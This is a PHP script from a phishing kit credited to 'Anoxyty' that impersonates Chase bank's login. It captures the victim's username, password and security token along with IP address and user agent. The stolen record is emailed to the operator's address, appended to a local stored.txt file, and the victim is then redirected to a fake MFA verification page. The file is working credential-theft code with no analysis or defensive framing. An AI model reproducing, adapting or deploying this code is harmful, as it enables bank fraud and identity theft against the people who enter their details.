<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include '../data.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
if (hash_equals($_SESSION['token'], $_POST['token'])) {
		
		$_SESSION['username'] 	  = $_POST['username'];
		$_SESSION['password'] 	  = $_POST['password'];
		$_SESSION['securityToken'] 	  = $_POST['securityToken'];
		$code = <<<EOT
============== [ CHASE By Anoxyty | ]🔥 ==============
[USERNAME] 		: {$_SESSION['username']}
[PASSWORD]		: {$_SESSION['password']}
[TOKEN]		: {$_SESSION['securityToken']}

	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 CHASE By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 CHASE User Info By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <chaseby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($data,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ../account_contacts?web/auth/#/logon/recognizeUser/mfaidentification");
        exit();
	} else {
		header("Location: ../404?");
		exit();
	}
?>